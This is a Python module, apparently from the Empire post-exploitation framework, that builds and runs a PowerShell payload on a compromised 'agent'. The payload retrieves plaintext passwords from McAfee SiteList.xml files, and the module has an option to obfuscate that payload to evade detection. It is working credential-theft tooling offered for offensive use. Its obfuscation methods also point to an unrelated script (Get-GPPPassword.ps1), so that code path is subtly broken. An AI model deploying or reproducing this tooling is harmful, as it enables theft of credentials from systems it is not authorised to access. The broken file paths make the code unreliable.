import os.path
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Get-SiteListPassword',

            'Author': ['@harmj0y', '@funoverip'],

            'Description': ("Retrieves the plaintext passwords for found McAfee's SiteList.xml files."),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/funoverip/mcafee-sitelist-pwd-decryption/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Get-SiteListPassword.ps1"
        if obfuscate:
            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Get-SiteListPassword.ps1"
            if not self.is_obfuscated():
                self.obfuscate(obfuscationCommand=obfuscationCommand)
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        script += "Get-SiteListPassword "

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        script += "| Out-String | %{$_ + \"`n\"};"
        script += "'Get-SiteListPassword completed'"
        return script

    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
        if self.is_obfuscated() and not forceReobfuscation:
            return

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Get-GPPPassword.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # obfuscate and write to obfuscated source path
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Get-GPPPassword.ps1"
        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        try:
            f = open(obfuscatedSource, 'w')
        except:
            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
            return ""
        f.write(obfuscatedCode)
        f.close()

    def is_obfuscated(self):
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Get-GPPPassword.ps1"
        return os.path.isfile(obfuscatedSource)
